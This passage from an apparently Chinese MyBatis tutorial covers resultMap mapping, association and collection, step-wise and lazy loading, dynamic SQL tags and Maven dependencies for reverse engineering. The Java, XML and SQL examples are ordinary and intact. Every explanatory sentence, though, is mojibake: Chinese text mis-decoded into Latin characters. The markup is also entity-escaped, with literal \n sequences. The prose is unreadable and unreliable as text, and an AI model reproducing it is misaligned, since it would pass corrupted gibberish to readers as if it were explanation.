select * from t_emp \u0026lt;/select\u0026gt; è‹¥å­—æ®µåå’Œå®ä½“ç±»ä¸­çš„å±æ€§åä¸ä¸€è‡´ï¼Œä½†æ˜¯å­—æ®µåç¬¦åˆæ•°æ®åº“çš„è§„åˆ™ï¼ˆä½¿ç”¨_ï¼‰ï¼Œå®ä½“ç±»ä¸­çš„å±æ€§åç¬¦åˆJavaçš„è§„åˆ™ï¼ˆä½¿ç”¨é©¼å³°ï¼‰ã€‚æ­¤æ—¶ä¹Ÿå¯é€šè¿‡ä»¥ä¸‹ä¸¤ç§æ–¹å¼å¤„ç†å­—æ®µåå’Œå®ä½“ç±»ä¸­çš„å±æ€§çš„æ˜ å°„å…³ç³»\nsqlè¯­å¥ä¸­å­—æ®µèµ·åˆ«å\n1 select eid,emp_name empName,age,sex,email from t_emp å¼€å¯mapUnderscoreToCamelCase\n1 2 3 \u0026lt;settings\u0026gt; \u0026lt;setting name=\u0026#34;mapUnderscoreToCamelCase\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;/settings\u0026gt; 6.2 å¤šå¯¹ä¸€æ˜ å°„ 1 2 3 4 5 6 7 8 9 public class Emp { private Integer eid; private String empName; private Integer age; private String sex; private String email; private Dept dept; //...æ„é€ å™¨ã€getã€setæ–¹æ³•ç­‰ } çº§è”æ–¹å¼å¤„ç†æ˜ å°„å…³ç³»\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;resultMap id=\u0026#34;empAndDeptResultMapOne\u0026#34; type=\u0026#34;Emp\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;eid\u0026#34; column=\u0026#34;eid\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;empName\u0026#34; column=\u0026#34;emp_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;age\u0026#34; column=\u0026#34;age\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;sex\u0026#34; column=\u0026#34;sex\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;dept.did\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;dept.deptName\u0026#34; column=\u0026#34;dept_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Emp getEmpAndDept(@Param(\u0026#34;eid\u0026#34;)Integer eid);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpAndDept\u0026#34; resultMap=\u0026#34;empAndDeptResultMapOne\u0026#34;\u0026gt; select * from t_emp left join t_dept on t_emp.eid = t_dept.did where t_emp.eid = #{eid} \u0026lt;/select\u0026gt; ä½¿ç”¨associationå¤„ç†æ˜ å°„å…³ç³»\nassociationï¼šå¤„ç†å¤šå¯¹ä¸€çš„æ˜ å°„å…³ç³» propertyï¼šéœ€è¦å¤„ç†å¤šå¯¹çš„æ˜ å°„å…³ç³»çš„å±æ€§å javaTypeï¼šè¯¥å±æ€§çš„ç±»å‹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;resultMap id=\u0026#34;empAndDeptResultMapTwo\u0026#34; type=\u0026#34;Emp\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;eid\u0026#34; column=\u0026#34;eid\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;empName\u0026#34; column=\u0026#34;emp_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;age\u0026#34; column=\u0026#34;age\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;sex\u0026#34; column=\u0026#34;sex\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;association property=\u0026#34;dept\u0026#34; javaType=\u0026#34;Dept\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;did\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;deptName\u0026#34; column=\u0026#34;dept_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;/association\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Emp getEmpAndDept(@Param(\u0026#34;eid\u0026#34;)Integer eid);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpAndDept\u0026#34; resultMap=\u0026#34;empAndDeptResultMapTwo\u0026#34;\u0026gt; select * from t_emp left join t_dept on t_emp.eid = t_dept.did where t_emp.eid = #{eid} \u0026lt;/select\u0026gt; åˆ†å¸ƒæŸ¥è¯¢\nå…¶å®å°±æ˜¯å°†å¦ä¸€æ¡mapperå®ç°çš„sqlè¯­å¥æ ¹æ®select=\u0026quot;com.atguigu.mybatis.mapper.DeptMapper.getEmpAndDeptByStepTwo\u0026quot; column=\u0026quot;did\u0026quot;å¯¼å…¥è¿›æ¥\næŸ¥è¯¢å‘˜å·¥ä¿¡æ¯\nselectï¼šè®¾ç½®åˆ†å¸ƒæŸ¥è¯¢çš„sqlçš„å”¯ä¸€æ ‡è¯†ï¼ˆnamespace.SQLIdæˆ–mapperæ¥å£çš„å…¨ç±»å.æ–¹æ³•åï¼‰ columnï¼šè®¾ç½®åˆ†æ­¥æŸ¥è¯¢çš„æ¡ä»¶ 1 2 3 4 5 6 7 8 9 //EmpMapperé‡Œçš„æ–¹æ³• /** * é€šè¿‡åˆ†æ­¥æŸ¥è¯¢ï¼Œå‘˜å·¥åŠæ‰€å¯¹åº”çš„éƒ¨é—¨ä¿¡æ¯ * åˆ†æ­¥æŸ¥è¯¢ç¬¬ä¸€æ­¥ï¼šæŸ¥è¯¢å‘˜å·¥ä¿¡æ¯ * @param * @return com.atguigu.mybatis.pojo.Emp * @date 2022/2/27 20:17 */ Emp getEmpAndDeptByStepOne(@Param(\u0026#34;eid\u0026#34;) Integer eid); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;resultMap id=\u0026#34;empAndDeptByStepResultMap\u0026#34; type=\u0026#34;Emp\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;eid\u0026#34; column=\u0026#34;eid\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;empName\u0026#34; column=\u0026#34;emp_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;age\u0026#34; column=\u0026#34;age\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;sex\u0026#34; column=\u0026#34;sex\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;association property=\u0026#34;dept\u0026#34; select=\u0026#34;com.atguigu.mybatis.mapper.DeptMapper.getEmpAndDeptByStepTwo\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/association\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Emp getEmpAndDeptByStepOne(@Param(\u0026#34;eid\u0026#34;) Integer eid);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpAndDeptByStepOne\u0026#34; resultMap=\u0026#34;empAndDeptByStepResultMap\u0026#34;\u0026gt; select * from t_emp where eid = #{eid} \u0026lt;/select\u0026gt; æŸ¥è¯¢éƒ¨é—¨ä¿¡æ¯\n1 2 3 4 5 6 7 8 9 //DeptMapperé‡Œçš„æ–¹æ³• /** * é€šè¿‡åˆ†æ­¥æŸ¥è¯¢ï¼Œå‘˜å·¥åŠæ‰€å¯¹åº”çš„éƒ¨é—¨ä¿¡æ¯ * åˆ†æ­¥æŸ¥è¯¢ç¬¬äºŒæ­¥ï¼šé€šè¿‡didæŸ¥è¯¢å‘˜å·¥å¯¹åº”çš„éƒ¨é—¨ä¿¡æ¯ * @param * @return com.atguigu.mybatis.pojo.Emp * @date 2022/2/27 20:23 */ Dept getEmpAndDeptByStepTwo(@Param(\u0026#34;did\u0026#34;) Integer did); 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;!--æ­¤å¤„çš„resultMapä»…æ˜¯å¤„ç†å­—æ®µå’Œå±æ€§çš„æ˜ å°„å…³ç³»--\u0026gt; \u0026lt;resultMap id=\u0026#34;EmpAndDeptByStepTwoResultMap\u0026#34; type=\u0026#34;Dept\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;did\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;deptName\u0026#34; column=\u0026#34;dept_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Dept getEmpAndDeptByStepTwo(@Param(\u0026#34;did\u0026#34;) Integer did);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpAndDeptByStepTwo\u0026#34; resultMap=\u0026#34;EmpAndDeptByStepTwoResultMap\u0026#34;\u0026gt; select * from t_dept where did = #{did} \u0026lt;/select\u0026gt; 6.3 ä¸€å¯¹å¤šæ˜ å°„å¤„ç† 1 2 3 4 5 6 public class Dept { private Integer did; private String deptName; private List\u0026lt;Emp\u0026gt; emps; //...æ„é€ å™¨ã€getã€setæ–¹æ³•ç­‰ } collection\ncollectionï¼šç”¨æ¥å¤„ç†ä¸€å¯¹å¤šçš„æ˜ å°„å…³ç³» ofTypeï¼šè¡¨ç¤ºè¯¥å±æ€§å¯¹é¥®çš„é›†åˆä¸­å­˜å‚¨çš„æ•°æ®çš„ç±»å‹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;resultMap id=\u0026#34;DeptAndEmpResultMap\u0026#34; type=\u0026#34;Dept\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;did\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;deptName\u0026#34; column=\u0026#34;dept_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;collection property=\u0026#34;emps\u0026#34; ofType=\u0026#34;Emp\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;eid\u0026#34; column=\u0026#34;eid\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;empName\u0026#34; column=\u0026#34;emp_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;age\u0026#34; column=\u0026#34;age\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;sex\u0026#34; column=\u0026#34;sex\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;/collection\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Dept getDeptAndEmp(@Param(\u0026#34;did\u0026#34;) Integer did);--\u0026gt; \u0026lt;select id=\u0026#34;getDeptAndEmp\u0026#34; resultMap=\u0026#34;DeptAndEmpResultMap\u0026#34;\u0026gt; select * from t_dept left join t_emp on t_dept.did = t_emp.did where t_dept.did = #{did} \u0026lt;/select\u0026gt; åˆ†æ­¥æŸ¥è¯¢\næŸ¥è¯¢éƒ¨é—¨ä¿¡æ¯\n1 2 3 4 5 6 7 8 /** * é€šè¿‡åˆ†æ­¥æŸ¥è¯¢ï¼ŒæŸ¥è¯¢éƒ¨é—¨åŠå¯¹åº”çš„æ‰€æœ‰å‘˜å·¥ä¿¡æ¯ * åˆ†æ­¥æŸ¥è¯¢ç¬¬ä¸€æ­¥ï¼šæŸ¥è¯¢éƒ¨é—¨ä¿¡æ¯ * @param did * @return com.atguigu.mybatis.pojo.Dept * @date 2022/2/27 22:04 */ Dept getDeptAndEmpByStepOne(@Param(\u0026#34;did\u0026#34;) Integer did); 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;resultMap id=\u0026#34;DeptAndEmpByStepOneResultMap\u0026#34; type=\u0026#34;Dept\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;did\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;deptName\u0026#34; column=\u0026#34;dept_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;collection property=\u0026#34;emps\u0026#34; select=\u0026#34;com.atguigu.mybatis.mapper.EmpMapper.getDeptAndEmpByStepTwo\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/collection\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Dept getDeptAndEmpByStepOne(@Param(\u0026#34;did\u0026#34;) Integer did);--\u0026gt; \u0026lt;select id=\u0026#34;getDeptAndEmpByStepOne\u0026#34; resultMap=\u0026#34;DeptAndEmpByStepOneResultMap\u0026#34;\u0026gt; select * from t_dept where did = #{did} \u0026lt;/select\u0026gt; æ ¹æ®éƒ¨é—¨idæŸ¥è¯¢éƒ¨é—¨ä¸­çš„æ‰€æœ‰å‘˜å·¥\n1 2 3 4 5 6 7 8 /** * é€šè¿‡åˆ†æ­¥æŸ¥è¯¢ï¼ŒæŸ¥è¯¢éƒ¨é—¨åŠå¯¹åº”çš„æ‰€æœ‰å‘˜å·¥ä¿¡æ¯ * åˆ†æ­¥æŸ¥è¯¢ç¬¬äºŒæ­¥ï¼šæ ¹æ®éƒ¨é—¨idæŸ¥è¯¢éƒ¨é—¨ä¸­çš„æ‰€æœ‰å‘˜å·¥ * @param did * @return java.util.List\u0026lt;com.atguigu.mybatis.pojo.Emp\u0026gt; * @date 2022/2/27 22:10 */ List\u0026lt;Emp\u0026gt; getDeptAndEmpByStepTwo(@Param(\u0026#34;did\u0026#34;) Integer did); 1 2 3 4 \u0026lt;!--List\u0026lt;Emp\u0026gt; getDeptAndEmpByStepTwo(@Param(\u0026#34;did\u0026#34;) Integer did);--\u0026gt; \u0026lt;select id=\u0026#34;getDeptAndEmpByStepTwo\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select * from t_emp where did = #{did} \u0026lt;/select\u0026gt; 7 å»¶è¿ŸåŠ è½½ åœ¨mybatis-config.xmlé‡Œé¢é…ç½®å»¶è¿ŸåŠ è½½\nlazyLoadingEnabledï¼šå»¶è¿ŸåŠ è½½çš„å…¨å±€å¼€å…³ã€‚å½“å¼€å¯æ—¶ï¼Œæ‰€æœ‰å…³è”å¯¹è±¡éƒ½ä¼šå»¶è¿ŸåŠ è½½ aggressiveLazyLoadingï¼šå½“å¼€å¯æ—¶ï¼Œä»»ä½•æ–¹æ³•çš„è°ƒç”¨éƒ½ä¼šåŠ è½½è¯¥å¯¹è±¡çš„æ‰€æœ‰å±æ€§ã€‚ å¦åˆ™ï¼Œæ¯ä¸ªå±æ€§ä¼šæŒ‰éœ€åŠ è½½ 1 2 3 4 \u0026lt;settings\u0026gt; \u0026lt;!--å¼€å¯å»¶è¿ŸåŠ è½½--\u0026gt; \u0026lt;setting name=\u0026#34;lazyLoadingEnabled\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;/settings\u0026gt; å¼€å¯å»¶è¿ŸåŠ è½½åï¼ŒæŸ¥è¯¢ç›¸å…³å†…å®¹æ˜¯ï¼Œåªæœ‰éœ€è¦ç”¨åˆ°çš„æ—¶å€™ï¼ŒæœåŠ¡æ‰å»è°ƒç”¨ç›¸åº”çš„ç¨‹åºã€‚\n8 åŠ¨æ€sql 8.1 if ifæ ‡ç­¾å¯é€šè¿‡testå±æ€§ï¼ˆå³ä¼ é€’è¿‡æ¥çš„æ•°æ®ï¼‰çš„è¡¨è¾¾å¼è¿›è¡Œåˆ¤æ–­ï¼Œè‹¥è¡¨è¾¾å¼çš„ç»“æœä¸ºtrueï¼Œåˆ™æ ‡ç­¾ä¸­çš„å†…å®¹ä¼šæ‰§è¡Œï¼›åä¹‹æ ‡ç­¾ä¸­çš„å†…å®¹ä¸ä¼šæ‰§è¡Œ åœ¨whereåé¢æ·»åŠ ä¸€ä¸ªæ’æˆç«‹æ¡ä»¶1=1 è¿™ä¸ªæ’æˆç«‹æ¡ä»¶å¹¶ä¸ä¼šå½±å“æŸ¥è¯¢çš„ç»“æœ è¿™ä¸ª1=1å¯ä»¥ç”¨æ¥æ‹¼æ¥andè¯­å¥ï¼Œä¾‹å¦‚ï¼šå½“empNameä¸ºnullæ—¶ å¦‚æœä¸åŠ ä¸Šæ’æˆç«‹æ¡ä»¶ï¼Œåˆ™SQLè¯­å¥ä¸ºselect * from t_emp where and age = ? and sex = ? and email = ?ï¼Œæ­¤æ—¶whereä¼šä¸andè¿ç”¨ï¼ŒSQLè¯­å¥ä¼šæŠ¥é”™ å¦‚æœåŠ ä¸Šä¸€ä¸ªæ’æˆç«‹æ¡ä»¶ï¼Œåˆ™SQLè¯­å¥ä¸ºselect * from t_emp where 1= 1 and age = ? and sex = ? and email = ?ï¼Œæ­¤æ—¶ä¸æŠ¥é”™ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;!--List\u0026lt;Emp\u0026gt; getEmpByCondition(Emp emp);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpByCondition\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select * from t_emp where 1=1 \u0026lt;if test=\u0026#34;empName != null and empName !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and emp_name = #{empName} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;age != null and age !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and age = #{age} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;sex != null and sex !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and sex = #{sex} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;email != null and email !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and email = #{email} \u0026lt;/if\u0026gt; \u0026lt;/select\u0026gt; 8.2 where whereå’Œifä¸€èˆ¬ç»“åˆä½¿ç”¨ï¼š\nè§£å†³å‰é¢å¸¦æœ‰and æˆ–è€… or\nè‹¥whereæ ‡ç­¾ä¸­çš„ifæ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œåˆ™whereæ ‡ç­¾æ²¡æœ‰ä»»ä½•åŠŸèƒ½ï¼Œå³ä¸ä¼šæ·»åŠ whereå…³é”®å­—\nè‹¥whereæ ‡ç­¾ä¸­çš„ifæ¡ä»¶æ»¡è¶³ï¼Œåˆ™whereæ ‡ç­¾ä¼šè‡ªåŠ¨æ·»åŠ whereå…³é”®å­—ï¼Œå¹¶å°†æ¡ä»¶æœ€å‰æ–¹å¤šä½™çš„and/orå»æ‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;!--List\u0026lt;Emp\u0026gt; getEmpByCondition(Emp emp);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpByCondition\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select * from t_emp \u0026lt;where\u0026gt; \u0026lt;if test=\u0026#34;empName != null and empName !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; emp_name = #{empName} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;age != null and age !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and age = #{age} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;sex != null and sex !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and sex = #{sex} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;email != null and email !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and email = #{email} \u0026lt;/if\u0026gt; \u0026lt;/where\u0026gt; \u0026lt;/select\u0026gt; æ³¨æ„ï¼šwhereæ ‡ç­¾ä¸èƒ½å»æ‰æ¡ä»¶åå¤šä½™çš„and/or\n1 2 3 4 5 6 7 \u0026lt;!--è¿™ç§ç”¨æ³•æ˜¯é”™è¯¯çš„ï¼Œåªèƒ½å»æ‰æ¡ä»¶å‰é¢çš„and/orï¼Œæ¡ä»¶åé¢çš„ä¸è¡Œ--\u0026gt; \u0026lt;if test=\u0026#34;empName != null and empName !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; emp_name = #{empName} and \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;age != null and age !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; age = #{age} \u0026lt;/if\u0026gt; 8.3 trim trimç”¨äºå»æ‰æˆ–æ·»åŠ æ ‡ç­¾ä¸­çš„å†…å®¹\nè§£å†³åé¢å¸¦æœ‰and æˆ–è€… or\nå¸¸ç”¨å±æ€§\nprefixï¼šåœ¨trimæ ‡ç­¾ä¸­çš„å†…å®¹çš„å‰é¢æ·»åŠ æŸäº›å†…å®¹\nsuffixï¼šåœ¨trimæ ‡ç­¾ä¸­çš„å†…å®¹çš„åé¢æ·»åŠ æŸäº›å†…å®¹ prefixOverridesï¼šåœ¨trimæ ‡ç­¾ä¸­çš„å†…å®¹çš„å‰é¢å»æ‰æŸäº›å†…å®¹ suffixOverridesï¼šåœ¨trimæ ‡ç­¾ä¸­çš„å†…å®¹çš„åé¢å»æ‰æŸäº›å†…å®¹ è‹¥trimä¸­çš„æ ‡ç­¾éƒ½ä¸æ»¡è¶³æ¡ä»¶ï¼Œåˆ™trimæ ‡ç­¾æ²¡æœ‰ä»»ä½•æ•ˆæœï¼Œä¹Ÿå°±æ˜¯åªå‰©ä¸‹select * from t_emp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;!--List\u0026lt;Emp\u0026gt; getEmpByCondition(Emp emp);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpByCondition\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select * from t_emp \u0026lt;trim prefix=\u0026#34;where\u0026#34; suffixOverrides=\u0026#34;and|or\u0026#34;\u0026gt; \u0026lt;if test=\u0026#34;empName != null and empName !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; emp_name = #{empName} and \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;age != null and age !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; age = #{age} and \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;sex != null and sex !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; sex = #{sex} or \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;email != null and email !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; email = #{email} \u0026lt;/if\u0026gt; \u0026lt;/trim\u0026gt; \u0026lt;/select\u0026gt; 8.4 chooseã€whenã€otherwise chooseã€whenã€otherwiseç›¸å½“äºif...else if..else\nwhenè‡³å°‘è¦æœ‰ä¸€ä¸ªï¼Œotherwiseè‡³å¤šåªæœ‰ä¸€ä¸ª\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;select id=\u0026#34;getEmpByChoose\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select * from t_emp \u0026lt;where\u0026gt; \u0026lt;choose\u0026gt; \u0026lt;when test=\u0026#34;empName != null and empName != \u0026#39;\u0026#39;\u0026#34;\u0026gt; emp_name = #{empName} \u0026lt;/when\u0026gt; \u0026lt;when test=\u0026#34;age != null and age != \u0026#39;\u0026#39;\u0026#34;\u0026gt; age = #{age} \u0026lt;/when\u0026gt; \u0026lt;when test=\u0026#34;sex != null and sex != \u0026#39;\u0026#39;\u0026#34;\u0026gt; sex = #{sex} \u0026lt;/when\u0026gt; \u0026lt;when test=\u0026#34;email != null and email != \u0026#39;\u0026#39;\u0026#34;\u0026gt; email = #{email} \u0026lt;/when\u0026gt; \u0026lt;otherwise\u0026gt; did = 1 \u0026lt;/otherwise\u0026gt; \u0026lt;/choose\u0026gt; \u0026lt;/where\u0026gt; \u0026lt;/select\u0026gt; 8.5 foreach å±æ€§ï¼š\ncollectionï¼šè®¾ç½®è¦å¾ªç¯çš„æ•°ç»„æˆ–é›†åˆ\nitemï¼šè¡¨ç¤ºé›†åˆæˆ–æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªæ•°æ® separatorï¼šè®¾ç½®å¾ªç¯ä½“ä¹‹é—´çš„åˆ†éš”ç¬¦ï¼Œåˆ†éš”ç¬¦å‰åé»˜è®¤æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œå¦‚, openï¼šè®¾ç½®foreachæ ‡ç­¾ä¸­çš„å†…å®¹çš„å¼€å§‹ç¬¦ closeï¼šè®¾ç½®foreachæ ‡ç­¾ä¸­çš„å†…å®¹çš„ç»“æŸç¬¦ æ‰¹é‡åˆ é™¤\n1 2 3 4 5 6 7 8 9 \u0026lt;!--int deleteMoreByArray(Integer[] eids); int result = mapper.deleteMoreByArray(new Integer[]{6, 7, 8, 9}); --\u0026gt; \u0026lt;delete id=\u0026#34;deleteMoreByArray\u0026#34;\u0026gt; delete from t_emp where eid in \u0026lt;foreach collection=\u0026#34;eids\u0026#34; item=\u0026#34;eid\u0026#34; separator=\u0026#34;,\u0026#34; open=\u0026#34;(\u0026#34; close=\u0026#34;)\u0026#34;\u0026gt; #{eid} \u0026lt;/foreach\u0026gt; \u0026lt;/delete\u0026gt; æ‰¹é‡æ·»åŠ \n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!--int insertMoreByList(@Param(\u0026#34;emps\u0026#34;) List\u0026lt;Emp\u0026gt; emps); List\u0026lt;Emp\u0026gt; emps = Arrays.asList(emp1, emp2, emp3); int result = mapper.insertMoreByList(emps); --\u0026gt; \u0026lt;insert id=\u0026#34;insertMoreByList\u0026#34;\u0026gt; insert into t_emp values \u0026lt;foreach collection=\u0026#34;emps\u0026#34; item=\u0026#34;emp\u0026#34; separator=\u0026#34;,\u0026#34;\u0026gt; (null,#{emp.empName},#{emp.age},#{emp.sex},#{emp.email},null) \u0026lt;/foreach\u0026gt; \u0026lt;/insert\u0026gt; 8.6 sql ç‰‡æ®µ sqlç‰‡æ®µï¼Œå¯ä»¥è®°å½•ä¸€æ®µå…¬å…±sqlç‰‡æ®µï¼Œåœ¨ä½¿ç”¨çš„åœ°æ–¹é€šè¿‡includeæ ‡ç­¾è¿›è¡Œå¼•å…¥ å£°æ˜sqlç‰‡æ®µï¼š\u0026lt;sql\u0026gt;æ ‡ç­¾ 1 \u0026lt;sql id=\u0026#34;empColumns\u0026#34;\u0026gt;eid,emp_name,age,sex,email\u0026lt;/sql\u0026gt; å¼•ç”¨sqlç‰‡æ®µï¼š\u0026lt;include\u0026gt;æ ‡ç­¾ 1 2 3 4 \u0026lt;!--List\u0026lt;Emp\u0026gt; getEmpByCondition(Emp emp);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpByCondition\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select \u0026lt;include refid=\u0026#34;empColumns\u0026#34;\u0026gt;\u0026lt;/include\u0026gt; from t_emp \u0026lt;/select\u0026gt; 9 MyBatisçš„é€†å‘å·¥ç¨‹ æ­£å‘å·¥ç¨‹ï¼šå…ˆåˆ›å»ºJavaå®ä½“ç±»ï¼Œç”±æ¡†æ¶è´Ÿè´£æ ¹æ®å®ä½“ç±»ç”Ÿæˆæ•°æ®åº“è¡¨ã€‚Hibernateæ˜¯æ”¯æŒæ­£å‘å·¥ç¨‹çš„\né€†å‘å·¥ç¨‹ï¼šå…ˆåˆ›å»ºæ•°æ®åº“è¡¨ï¼Œç”±æ¡†æ¶è´Ÿè´£æ ¹æ®æ•°æ®åº“è¡¨ï¼Œåå‘ç”Ÿæˆå¦‚ä¸‹èµ„æºï¼š\nJavaå®ä½“ç±»\nMapperæ¥å£ Mapperæ˜ å°„æ–‡ä»¶ æ·»åŠ ä¾èµ–\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 \u0026lt;dependencies\u0026gt; \u0026lt;!-- MyBatisæ ¸å¿ƒä¾èµ–åŒ… --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.9\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- junitæµ‹è¯• --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;junit\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;junit\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.13.2\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- MySQLé©±åŠ¨ --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.0.27\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- log4jæ—¥å¿— --\u0026gt; \u0026lt;dependency\u0026gt; 